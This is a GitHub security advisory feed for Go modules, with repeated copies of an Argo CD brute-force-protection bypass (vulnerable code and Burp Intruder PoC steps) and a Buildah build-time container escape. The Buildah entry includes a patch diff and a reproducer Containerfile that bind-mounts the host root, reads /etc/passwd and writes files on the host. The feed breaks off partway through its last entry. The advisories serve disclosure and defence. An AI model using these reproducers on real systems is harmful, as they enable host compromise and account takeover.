<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
    <title>Security Advisory for Go modules</title>
    <updated>2024-03-25T01:23:10.927Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
    <subtitle>Security Advisory for Go modules on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[github.com/argoproj/argo-cd/v2] Bypassing Rate Limit and Brute Force Protection Using Cache Overflow]]></title>
        <id>https://github.com/advisories/GHSA-2vgg-9h6w-m454</id>
        <link href="https://github.com/advisories/GHSA-2vgg-9h6w-m454"/>
        <updated>2024-03-22T20:05:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An attacker can effectively bypass the rate limit and brute force protections by exploiting the application's weak cache-based mechanism. This loophole in security can be combined with other vulnerabilities to attack the default admin account. This flaw undermines a previously <a href="https://argo-cd.readthedocs.io/en/stable/security_considerations/#cve-2020-8827-insufficient-anti-automationanti-brute-force">patched CVE</a> intended to protect against brute-force attacks.</p>
<h3 id="details">Details</h3>
<p>The application's brute force protection relies on a cache mechanism that tracks login attempts for each user. This cache is limited to a <code>defaultMaxCacheSize</code> of 1000 entries. An attacker can overflow this cache by bombarding it with login attempts for different users, thereby pushing out the admin account's failed attempts and effectively resetting the rate limit for that account.</p>
<p>The brute force protection mechanism's code:</p>
<pre><code class="language-go">   if failed &amp;&amp; len(failures) &gt;= getMaximumCacheSize() {
       log.Warnf("Session cache size exceeds %d entries, removing random entry",

getMaximumCacheSize())
       idx := rand.Intn(len(failures) - 1)
       var rmUser string
       i := 0
       for key := range failures {

           if i == idx {
               rmUser = key

               delete(failures, key)

break

}

i++ }

       log.Infof("Deleted entry for user %s from cache", rmUser)
   }
</code></pre>
<h3 id="poc">PoC</h3>
<ol>
<li>Set up the application environment and identify the login page.</li>
<li>Execute 4 failed login attempts for the admin account.</li>
<li>Run a Burp Intruder attack to populate the cache with login attempts for usernames ranging from 1 to 10000.</li>
<li>After 1000 attempts, start monitoring to see if the admin entries in the cache have been cleared.</li>
<li>At this point, brute-force the admin account.</li>
</ol>
<p>In just 15 minutes, the PoC was able to perform 230 brute force attempts on the admin account. This rate allows for approximately 1000 requests per hour, effectively rendering the <a href="https://argo-cd.readthedocs.io/en/stable/security_considerations/#cve-2020-8827-insufficient-anti-automationanti-brute-force">older CVE</a> rate limit patches useless.</p>
<h3 id="impact">Impact</h3>
<p>This is a severe vulnerability that enables attackers to perform brute force attacks at an accelerated rate, especially targeting the default admin account.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/argoproj/argo-cd/security/advisories/GHSA-2vgg-9h6w-m454">https://github.com/argoproj/argo-cd/security/advisories/GHSA-2vgg-9h6w-m454</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21662">https://nvd.nist.gov/vuln/detail/CVE-2024-21662</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/17b0df1168a4c535f6f37e95f25ed7cd81e1fa4d">https://github.com/argoproj/argo-cd/commit/17b0df1168a4c535f6f37e95f25ed7cd81e1fa4d</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/6e181d72b31522f886a2afa029d5b26d7912ec7b">https://github.com/argoproj/argo-cd/commit/6e181d72b31522f886a2afa029d5b26d7912ec7b</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/cebb6538f7944c87ca2fecb5d17f8baacc431456">https://github.com/argoproj/argo-cd/commit/cebb6538f7944c87ca2fecb5d17f8baacc431456</a></li>
<li><a href="https://argo-cd.readthedocs.io/en/stable/security_considerations/#cve-2020-8827-insufficient-anti-automationanti-brute-force">https://argo-cd.readthedocs.io/en/stable/security_considerations/#cve-2020-8827-insufficient-anti-automationanti-brute-force</a></li>
<li><a href="https://github.com/advisories/GHSA-2vgg-9h6w-m454">https://github.com/advisories/GHSA-2vgg-9h6w-m454</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2vgg-9h6w-m454</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-18T20:29:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/argoproj/argo-cd/v2] Bypassing Rate Limit and Brute Force Protection Using Cache Overflow]]></title>
        <id>https://github.com/advisories/GHSA-2vgg-9h6w-m454</id>
        <link href="https://github.com/advisories/GHSA-2vgg-9h6w-m454"/>
        <updated>2024-03-22T20:05:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An attacker can effectively bypass the rate limit and brute force protections by exploiting the application's weak cache-based mechanism. This loophole in security can be combined with other vulnerabilities to attack the default admin account. This flaw undermines a previously <a href="https://argo-cd.readthedocs.io/en/stable/security_considerations/#cve-2020-8827-insufficient-anti-automationanti-brute-force">patched CVE</a> intended to protect against brute-force attacks.</p>
<h3 id="details">Details</h3>
<p>The application's brute force protection relies on a cache mechanism that tracks login attempts for each user. This cache is limited to a <code>defaultMaxCacheSize</code> of 1000 entries. An attacker can overflow this cache by bombarding it with login attempts for different users, thereby pushing out the admin account's failed attempts and effectively resetting the rate limit for that account.</p>
<p>The brute force protection mechanism's code:</p>
<pre><code class="language-go">   if failed &amp;&amp; len(failures) &gt;= getMaximumCacheSize() {
       log.Warnf("Session cache size exceeds %d entries, removing random entry",

getMaximumCacheSize())
       idx := rand.Intn(len(failures) - 1)
       var rmUser string
       i := 0
       for key := range failures {

           if i == idx {
               rmUser = key

               delete(failures, key)

break

}

i++ }

       log.Infof("Deleted entry for user %s from cache", rmUser)
   }
</code></pre>
<h3 id="poc">PoC</h3>
<ol>
<li>Set up the application environment and identify the login page.</li>
<li>Execute 4 failed login attempts for the admin account.</li>
<li>Run a Burp Intruder attack to populate the cache with login attempts for usernames ranging from 1 to 10000.</li>
<li>After 1000 attempts, start monitoring to see if the admin entries in the cache have been cleared.</li>
<li>At this point, brute-force the admin account.</li>
</ol>
<p>In just 15 minutes, the PoC was able to perform 230 brute force attempts on the admin account. This rate allows for approximately 1000 requests per hour, effectively rendering the <a href="https://argo-cd.readthedocs.io/en/stable/security_considerations/#cve-2020-8827-insufficient-anti-automationanti-brute-force">older CVE</a> rate limit patches useless.</p>
<h3 id="impact">Impact</h3>
<p>This is a severe vulnerability that enables attackers to perform brute force attacks at an accelerated rate, especially targeting the default admin account.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/argoproj/argo-cd/security/advisories/GHSA-2vgg-9h6w-m454">https://github.com/argoproj/argo-cd/security/advisories/GHSA-2vgg-9h6w-m454</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21662">https://nvd.nist.gov/vuln/detail/CVE-2024-21662</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/17b0df1168a4c535f6f37e95f25ed7cd81e1fa4d">https://github.com/argoproj/argo-cd/commit/17b0df1168a4c535f6f37e95f25ed7cd81e1fa4d</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/6e181d72b31522f886a2afa029d5b26d7912ec7b">https://github.com/argoproj/argo-cd/commit/6e181d72b31522f886a2afa029d5b26d7912ec7b</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/cebb6538f7944c87ca2fecb5d17f8baacc431456">https://github.com/argoproj/argo-cd/commit/cebb6538f7944c87ca2fecb5d17f8baacc431456</a></li>
<li><a href="https://argo-cd.readthedocs.io/en/stable/security_considerations/#cve-2020-8827-insufficient-anti-automationanti-brute-force">https://argo-cd.readthedocs.io/en/stable/security_considerations/#cve-2020-8827-insufficient-anti-automationanti-brute-force</a></li>
<li><a href="https://github.com/advisories/GHSA-2vgg-9h6w-m454">https://github.com/advisories/GHSA-2vgg-9h6w-m454</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2vgg-9h6w-m454</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-18T20:29:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/argoproj/argo-cd/v2] Bypassing Rate Limit and Brute Force Protection Using Cache Overflow]]></title>
        <id>https://github.com/advisories/GHSA-2vgg-9h6w-m454</id>
        <link href="https://github.com/advisories/GHSA-2vgg-9h6w-m454"/>
        <updated>2024-03-22T20:05:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An attacker can effectively bypass the rate limit and brute force protections by exploiting the application's weak cache-based mechanism. This loophole in security can be combined with other vulnerabilities to attack the default admin account. This flaw undermines a previously <a href="https://argo-cd.readthedocs.io/en/stable/security_considerations/#cve-2020-8827-insufficient-anti-automationanti-brute-force">patched CVE</a> intended to protect against brute-force attacks.</p>
<h3 id="details">Details</h3>
<p>The application's brute force protection relies on a cache mechanism that tracks login attempts for each user. This cache is limited to a <code>defaultMaxCacheSize</code> of 1000 entries. An attacker can overflow this cache by bombarding it with login attempts for different users, thereby pushing out the admin account's failed attempts and effectively resetting the rate limit for that account.</p>
<p>The brute force protection mechanism's code:</p>
<pre><code class="language-go">   if failed &amp;&amp; len(failures) &gt;= getMaximumCacheSize() {
       log.Warnf("Session cache size exceeds %d entries, removing random entry",

getMaximumCacheSize())
       idx := rand.Intn(len(failures) - 1)
       var rmUser string
       i := 0
       for key := range failures {

           if i == idx {
               rmUser = key

               delete(failures, key)

break

}

i++ }

       log.Infof("Deleted entry for user %s from cache", rmUser)
   }
</code></pre>
<h3 id="poc">PoC</h3>
<ol>
<li>Set up the application environment and identify the login page.</li>
<li>Execute 4 failed login attempts for the admin account.</li>
<li>Run a Burp Intruder attack to populate the cache with login attempts for usernames ranging from 1 to 10000.</li>
<li>After 1000 attempts, start monitoring to see if the admin entries in the cache have been cleared.</li>
<li>At this point, brute-force the admin account.</li>
</ol>
<p>In just 15 minutes, the PoC was able to perform 230 brute force attempts on the admin account. This rate allows for approximately 1000 requests per hour, effectively rendering the <a href="https://argo-cd.readthedocs.io/en/stable/security_considerations/#cve-2020-8827-insufficient-anti-automationanti-brute-force">older CVE</a> rate limit patches useless.</p>
<h3 id="impact">Impact</h3>
<p>This is a severe vulnerability that enables attackers to perform brute force attacks at an accelerated rate, especially targeting the default admin account.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/argoproj/argo-cd/security/advisories/GHSA-2vgg-9h6w-m454">https://github.com/argoproj/argo-cd/security/advisories/GHSA-2vgg-9h6w-m454</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21662">https://nvd.nist.gov/vuln/detail/CVE-2024-21662</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/17b0df1168a4c535f6f37e95f25ed7cd81e1fa4d">https://github.com/argoproj/argo-cd/commit/17b0df1168a4c535f6f37e95f25ed7cd81e1fa4d</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/6e181d72b31522f886a2afa029d5b26d7912ec7b">https://github.com/argoproj/argo-cd/commit/6e181d72b31522f886a2afa029d5b26d7912ec7b</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/cebb6538f7944c87ca2fecb5d17f8baacc431456">https://github.com/argoproj/argo-cd/commit/cebb6538f7944c87ca2fecb5d17f8baacc431456</a></li>
<li><a href="https://argo-cd.readthedocs.io/en/stable/security_considerations/#cve-2020-8827-insufficient-anti-automationanti-brute-force">https://argo-cd.readthedocs.io/en/stable/security_considerations/#cve-2020-8827-insufficient-anti-automationanti-brute-force</a></li>
<li><a href="https://github.com/advisories/GHSA-2vgg-9h6w-m454">https://github.com/advisories/GHSA-2vgg-9h6w-m454</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2vgg-9h6w-m454</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-18T20:29:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/containers/buildah] Container escape at build time]]></title>
        <id>https://github.com/advisories/GHSA-pmf3-c36m-g5cf</id>
        <link href="https://github.com/advisories/GHSA-pmf3-c36m-g5cf"/>
        <updated>2024-03-22T20:04:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><em>What kind of vulnerability is it? Who is impacted?</em></p>
<p>Users running containers with root privileges allowing a container to run with read/write access to the host system files when selinux is not enabled.  With selinux enabled, some read access is allowed.</p>
<h3 id="patches">Patches</h3>
<p>From @nalind </p>
<pre><code># cat /root/cve-2024-1753.diff
--- internal/volumes/volumes.go
+++ internal/volumes/volumes.go
@@ -11,6 +11,7 @@ import (
 
     "errors"
 
+	"github.com/containers/buildah/copier"
     "github.com/containers/buildah/define"
     "github.com/containers/buildah/internal"
     internalParse "github.com/containers/buildah/internal/parse"
@@ -189,7 +190,11 @@ func GetBindMount(ctx *types.SystemContext, args []string, contextDir string, st
     // buildkit parity: support absolute path for sources from current build context
     if contextDir != "" {
         // path should be /contextDir/specified path
-		newMount.Source = filepath.Join(contextDir, filepath.Clean(string(filepath.Separator)+newMount.Source))
+		evaluated, err := copier.Eval(contextDir, newMount.Source, copier.EvalOptions{})
+		if err != nil {
+			return newMount, "", err
+		}
+		newMount.Source = evaluated
     } else {
         // looks like its coming from `build run --mount=type=bind` allow using absolute path
         // error out if no source is set
</code></pre>
<h3 id="reproducer">Reproducer</h3>
<p>Prior to testing, as root, add a memorable username to <code>/etc/passwd</code> via adduser or your favorite editor.   Also create a memorably named file in <code>/</code>.  Suggest: <code>touch /SHOULDNTSEETHIS.txt</code> and <code>adduser SHOULDNTSEETHIS</code>.  After testing, remember to remove both the file and the user from your system.</p>
<p>Use the following Containerfile</p>
<pre><code># cat ~/cve_Containerfile
FROM alpine as base

RUN ln -s / /rootdir
RUN ln -s /etc /etc2

FROM alpine

RUN echo "ls container root"
RUN ls -l /

RUN echo "With exploit show host root, not the container's root, and create /BIND_BREAKOUT in / on the host"
RUN --mount=type=bind,from=base,source=/rootdir,destination=/exploit,rw ls -l /exploit; touch /exploit/BIND_BREAKOUT; ls -l /exploit

RUN echo "With exploit show host /etc/passwd, not the container's, and create /BIND_BREAKOUT2 in /etc on the host"
RUN --mount=type=bind,rw,source=/etc2,destination=/etc2,from=base ls -l /; ls -l /etc2/passwd; cat /etc2/passwd; touch /etc2/BIND_BREAKOUT2; ls -l /etc2 
</code></pre>
<h4 id="to-test">To Test</h4>
<h5 id="testing-with-an-older-version-of-buildah-with-the-issue">Testing with an older version of Buildah with the issue</h5>
<pre><code>setenforce 0
buildah build -f ~/cve_Containerfile .
</code></pre>
<p>As part of the printout from the build, you should be able to see the contents of the <code>/' and </code>/etc<code>directories, including the</code>/SHOULDNOTSEETHIS.txt<code>file that you created, and the contents of the</code>/etc/passwd<code>file which will include the</code>SHOULDNOTSEETHIS<code>user that you created.  In addition, the file</code>/BIND_BREAKOUT<code>and</code>/etc/BIND_BREAKOUT2` will exist on the host after the command is completed.  Be sure to remove those two files between tests.  </p>
<pre><code>buildah rm -a
buildah rmi -a
rm /BIND_BREAKOUT
rm /etc/BIND_BREAKOUT2
setenforce 1
buildah build -f ~/cve_Containerfile .
</code></pre>
<p>Neither the <code>/BIND_BREAKEOUT</code> or <code>/etc/BIND_BREAKOUT2</code> files should be created.  An error should be raised during the build when both files are trying to be created.  Also, errors will be raised when the build tries to display the contents of the <code>/etc/passwd</code> file, and nothing will be displayed from that file.  </p>
<p>However, the files in both the <code>/</code> and <code>/etc</code> directories on the host system will be displayed.</p>
<h5 id="testing-with-the-patch">Testing with the patch</h5>
<p>Use the same commands as testing with an older version of Buildah.</p>
<p>When running using the patched version of Buildah, regardless of the <code>setenforce</code> settings,  you should not see the file that you created or the user that you added.  Also the <code>/BIND_BREAKOUT</code> and the <code>/etc/BIND_BREAKOUT</code> will not exist on the host after the test completes.</p>
<p>NOTE: With the fix, the contents of the <code>/</code> and <code>/etc</code> directories, and the <code>/etc/passwd</code> file will be displayed, however, it will be the file and contents from the container image, and NOT the host system.  Also the <code>/BIND_BREAKOUT</code> and <code>/etc/BIND_BREAKOUT</code> files will be created in the container image.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Ensure selinux controls are in place to avoid compromising sensitive system files and systems.  With "setenforce 0" set, which is not at all advised, the root file system is open for modification with this exploit.  With "setenfoce 1" set, which is the recommendation, files can not be changed.  However, the contents of the <code>/</code> directory can be displayed.  I.e., <code>ls -alF /</code> will show the contents of the host directory.</p>
<h3 id="references">References</h3>
<p>Unknown.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf">https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf</a></li>
<li><a href="https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5">https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5</a></li>
<li><a href="https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087">https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087</a></li>
<li><a href="https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8">https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2265513">https://bugzilla.redhat.com/show_bug.cgi?id=2265513</a></li>
<li><a href="https://github.com/advisories/GHSA-pmf3-c36m-g5cf">https://github.com/advisories/GHSA-pmf3-c36m-g5cf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pmf3-c36m-g5cf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-19T20:06:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/containers/buildah] Container escape at build time]]></title>
        <id>https://github.com/advisories/GHSA-pmf3-c36m-g5cf</id>
        <link href="https://github.com/advisories/GHSA-pmf3-c36m-g5cf"/>
        <updated>2024-03-22T20:04:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><em>What kind of vulnerability is it? Who is impacted?</em></p>
<p>Users running containers with root privileges allowing a container to run with read/write access to the host system files when selinux is not enabled.  With selinux enabled, some read access is allowed.</p>
<h3 id="patches">Patches</h3>
<p>From @nalind </p>
<pre><code># cat /root/cve-2024-1753.diff
--- internal/volumes/volumes.go
+++ internal/volumes/volumes.go
@@ -11,6 +11,7 @@ import (
 
     "errors"
 
+	"github.com/containers/buildah/copier"
     "github.com/containers/buildah/define"
     "github.com/containers/buildah/internal"
     internalParse "github.com/containers/buildah/internal/parse"
@@ -189,7 +190,11 @@ func GetBindMount(ctx *types.SystemContext, args []string, contextDir string, st
     // buildkit parity: support absolute path for sources from current build context
     if contextDir != "" {
         // path should be /contextDir/specified path
-		newMount.Source = filepath.Join(contextDir, filepath.Clean(string(filepath.Separator)+newMount.Source))
+		evaluated, err := copier.Eval(contextDir, newMount.Source, copier.EvalOptions{})
+		if err != nil {
+			return newMount, "", err
+		}
+		newMount.Source = evaluated
     } else {
         // looks like its coming from `build run --mount=type=bind` allow using absolute path
         // error out if no source is set
</code></pre>
<h3 id="reproducer">Reproducer</h3>
<p>Prior to testing, as root, add a memorable username to <code>/etc/passwd</code> via adduser or your favorite editor.   Also create a memorably named file in <code>/</code>.  Suggest: <code>touch /SHOULDNTSEETHIS.txt</code> and <code>adduser SHOULDNTSEETHIS</code>.  After testing, remember to remove both the file and the user from your system.</p>
<p>Use the following Containerfile</p>
<pre><code># cat ~/cve_Containerfile
FROM alpine as base

RUN ln -s / /rootdir
RUN ln -s /etc /etc2

FROM alpine

RUN echo "ls container root"
RUN ls -l /

RUN echo "With exploit show host root, not the container's root, and create /BIND_BREAKOUT in / on the host"
RUN --mount=type=bind,from=base,source=/rootdir,destination=/exploit,rw ls -l /exploit; touch /exploit/BIND_BREAKOUT; ls -l /exploit

RUN echo "With exploit show host /etc/passwd, not the container's, and create /BIND_BREAKOUT2 in /etc on the host"
RUN --mount=type=bind,rw,source=/etc2,destination=/etc2,from=base ls -l /; ls -l /etc2/passwd; cat /etc2/passwd; touch /etc2/BIND_BREAKOUT2; ls -l /etc2 
</code></pre>
<h4 id="to-test">To Test</h4>
<h5 id="testing-with-an-older-version-of-buildah-with-the-issue">Testing with an older version of Buildah with the issue</h5>
<pre><code>setenforce 0
buildah build -f ~/cve_Containerfile .
</code></pre>
<p>As part of the printout from the build, you should be able to see the contents of the <code>/' and </code>/etc<code>directories, including the</code>/SHOULDNOTSEETHIS.txt<code>file that you created, and the contents of the</code>/etc/passwd<code>file which will include the</code>SHOULDNOTSEETHIS<code>user that you created.  In addition, the file</code>/BIND_BREAKOUT<code>and</code>/etc/BIND_BREAKOUT2` will exist on the host after the command is completed.  Be sure to remove those two files between tests.  </p>
<pre><code>buildah rm -a
buildah rmi -a
rm /BIND_BREAKOUT
rm /etc/BIND_BREAKOUT2
setenforce 1
buildah build -f ~/cve_Containerfile .
</code></pre>
<p>Neither the <code>/BIND_BREAKEOUT</code> or <code>/etc/BIND_BREAKOUT2</code> files should be created.  An error should be raised during the build when both files are trying to be created.  Also, errors will be raised when the build tries to display the contents of the <code>/etc/passwd</code> file, and nothing will be displayed from that file.  </p>
<p>However, the files in both the <code>/</code> and <code>/etc</code> directories on the host system will be displayed.</p>
<h5 id="testing-with-the-patch">Testing with the patch</h5>
<p>Use the same commands as testing with an older version of Buildah.</p>
<p>When running using the patched version of Buildah, regardless of the <code>setenforce</code> settings,  you should not see the file that you created or the user that you added.  Also the <code>/BIND_BREAKOUT</code> and the <code>/etc/BIND_BREAKOUT</code> will not exist on the host after the test completes.</p>
<p>NOTE: With the fix, the contents of the <code>/</code> and <code>/etc</code> directories, and the <code>/etc/passwd</code> file will be displayed, however, it will be the file and contents from the container image, and NOT the host system.  Also the <code>/BIND_BREAKOUT</code> and <code>/etc/BIND_BREAKOUT</code> files will be created in the container image.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Ensure selinux controls are in place to avoid compromising sensitive system files and systems.  With "setenforce 0" set, which is not at all advised, the root file system is open for modification with this exploit.  With "setenfoce 1" set, which is the recommendation, files can not be changed.  However, the contents of the <code>/</code> directory can be displayed.  I.e., <code>ls -alF /</code> will show the contents of the host directory.</p>
<h3 id="references">References</h3>
<p>Unknown.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf">https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf</a></li>
<li><a href="https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5">https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5</a></li>
<li><a href="https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087">https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087</a></li>
<li><a href="https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8">https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2265513">https://bugzilla.redhat.com/show_bug.cgi?id=2265513</a></li>
<li><a href="https://github.com/advisories/GHSA-pmf3-c36m-g5cf">https://github.com/advisories/GHSA-pmf3-c36m-g5cf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pmf3-c36m-g5cf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-19T20:06:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/containers/buildah] Container escape at build time]]></title>
        <id>https://github.com/advisories/GHSA-pmf3-c36m-g5cf</id>
        <link href="https://github.com/advisories/GHSA-pmf3-c36m-g5cf"/>
        <updated>2024-03-22T20:04:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><em>What kind of vulnerability is it? Who is impacted?</em></p>
<p>Users running containers with root privileges allowing a container to run with read/write access to the host system files when selinux is not enabled.  With selinux enabled, some read access is allowed.</p>
<h3 id="patches">Patches</h3>
<p>From @nalind </p>
<pre><code># cat /root/cve-2024-1753.diff
--- internal/volumes/volumes.go
+++ internal/volumes/volumes.go
@@ -11,6 +11,7 @@ import (
 
     "errors"
 
+	"github.com/containers/buildah/copier"
     "github.com/containers/buildah/define"
     "github.com/containers/buildah/internal"
     internalParse "github.com/containers/buildah/internal/parse"
@@ -189,7 +190,11 @@ func GetBindMount(ctx *types.SystemContext, args []string, contextDir string, st
     // buildkit parity: support absolute path for sources from current build context
     if contextDir != "" {
         // path should be /contextDir/specified path
-		newMount.Source = filepath.Join(contextDir, filepath.Clean(string(filepath.Separator)+newMount.Source))
+		evaluated, err := copier.Eval(contextDir, newMount.Source, copier.EvalOptions{})
+		if err != nil {
+			return newMount, "", err
+		}
+		newMount.Source = evaluated
     } else {
         // looks like its coming from `build run --mount=type=bind` allow using absolute path
         // error out if no source is set
</code></pre>
<h3 id="reproducer">Reproducer</h3>
<p>Prior to testing, as root, add a memorable username to <code>/etc/passwd</code> via adduser or your favorite editor.   Also create a memorably named file in <code>/</code>.  Suggest: <code>touch /SHOULDNTSEETHIS.txt</code> and <code>adduser SHOULDNTSEETHIS</code>.  After testing, remember to remove both the file and the user from your system.</p>
<p>Use the following Containerfile</p>
<pre><code># cat ~/cve_Containerfile
FROM alpine as base

RUN ln -s / /rootdir
RUN ln -s /etc /etc2

FROM alpine

RUN echo "ls container root"
RUN ls -l /

RUN echo "With exploit show host root, not the container's root, and create /BIND_BREAKOUT in / on the host"
RUN --mount=type=bind,from=base,source=/rootdir,destination=/exploit,rw ls -l /exploit; touch /exploit/BIND_BREAKOUT; ls -l /exploit

RUN echo "With exploit show host /etc/passwd, not the container's, and create /BIND_BREAKOUT2 in /etc on the host"
RUN --mount=type=bind,rw,source=/etc2,destination=/etc2,from=base ls -l /; ls -l /etc2/passwd; cat /etc2/passwd; touch /etc2/BIND_BREAKOUT2; ls -l /etc2 
</code></pre>
<h4 id="to-test">To Test</h4>
<h5 id="testing-with-an-older-version-of-buildah-with-the-issue">Testing with an older version of Buildah with the issue</h5>
<pre><code>setenforce 0
buildah build -f ~/cve_Containerfile .
</code></pre>
<p>As part of the printout from the build, you should be able to see the contents of the <code>/' and </code>/etc<code>directories, including the</code>/SHOULDNOTSEETHIS.txt<code>file that you created, and the contents of the</code>/etc/passwd<code>file which will include the</code>SHOULDNOTSEETHIS<code>user that you created.  In addition, the file</code>/BIND_BREAKOUT<code>and</code>/etc/BIND_BREAKOUT2` will exist on the host after the command is completed.  Be sure to remove those two files between tests.  </p>
<pre><code>buildah rm -a
buildah rmi -a
rm /BIND_BREAKOUT
rm /etc/BIND_BREAKOUT2
setenforce 1
buildah build -f ~/cve_Containerfile .
</code></pre>
<p>Neither the <code>/BIND_BREAKEOUT</code> or <code>/etc/BIND_BREAKOUT2</code> files should be created.  An error should be raised during the build when both files are trying to be created.  Also, errors will be raised when the build tries to display the contents of the <code>/etc/passwd</code> file, and nothing will be displayed from that file.  </p>
<p>However, the files in both the <code>/</code> and <code>/etc</code> directories on the host system will be displayed.</p>
<h5 id="testing-with-the-patch">Testing with the patch</h5>
<p>Use the same commands as testing with an older version of Buildah.</p>
<p>When running using the patched version of Buildah, regardless of the <code>setenforce</code> settings,  you should not see the file that you created or the user that you added.  Also the <code>/BIND_BREAKOUT</code> and the <code>/etc/BIND_BREAKOUT</code> will not exist on the host after the test completes.</p>
<p>NOTE: With the fix, the contents of the <code>/</code> and <code>/etc</code> directories, and the <code>/etc/passwd</code> file will be displayed, however, it will be the file and contents from the container image, and NOT the host system.  Also the <code>/BIND_BREAKOUT</code> and <code>/etc/BIND_BREAKOUT</code> files will be created in the container image.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Ensure selinux controls are in place to avoid compromising sensitive system files and systems.  With "setenforce 0" set, which is not at all advised, the root file system is open for modification with this exploit.  With "setenfoce 1" set, which is the recommendation, files can not be changed.  However, the contents of the <code>/</code> directory can be displayed.  I.e., <code>ls -alF /</code> will show the contents of the host directory.</p>
<h3 id="references">References</h3>
<p>Unknown.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf">https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf</a></li>
<li><a href="https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5">https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5</a></li>
<li><a href="https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087">https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087</a></li>
<li><a href="https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8">https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2265513">https://bugzilla.redhat.com/show_bug.cgi?id=2265513</a></li>
